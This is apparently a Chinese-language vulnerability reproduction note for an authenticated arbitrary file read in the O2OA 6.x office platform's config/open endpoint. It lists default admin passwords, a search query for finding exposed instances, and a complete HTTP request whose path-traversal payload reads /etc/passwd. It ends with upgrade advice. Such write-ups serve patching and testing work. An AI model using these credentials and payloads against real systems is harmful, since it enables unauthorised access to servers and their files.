# O2OA open 后台任意文件读取漏洞

## 漏洞描述

O2OA 是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动 OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA 系统 open 接口存在任意文件读取漏洞。攻击者可利用漏洞读取任意文件。

## 漏洞影响

```
O2OA 6.x
```

## 网络测绘

```
title=="O2OA"
```

## 环境搭建

在 [官网下载](https://www.o2oa.net/download.html) 一个 6.2.0 版本，本地搭建测试：

```
unzip o2server-6.2.0-linux-x64.zip 
cd o2server
./start_linux.sh
```

![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228143549531.png)

## 漏洞复现

默认密码登录后台 `xadmin/o2`（或 `xadmin/o2oa@2022`）。

发送数据包：

```
POST /x_program_center/jaxrs/config/open?v=6.3 HTTP/1.1
Host: 10.0.12.15:20030
Accept: */*
Referer: http://10.0.12.15/
Accept-Encoding: gzip, deflate
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://10.0.12.15
authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
Content-Length: 1048

{"fileName":"../../../etc/passwd"}
```

![](images/O2OA%20open%20后台任意文件读取漏洞/image-20250228160632284.png)

文件不存在时，响应包：

![](images/O2OA%20open%20后台任意文件读取漏洞/image-20250228160910347.png)

## 漏洞修复

建议升级 O2OA 最新版本： https://www.o2oa.net/download.html
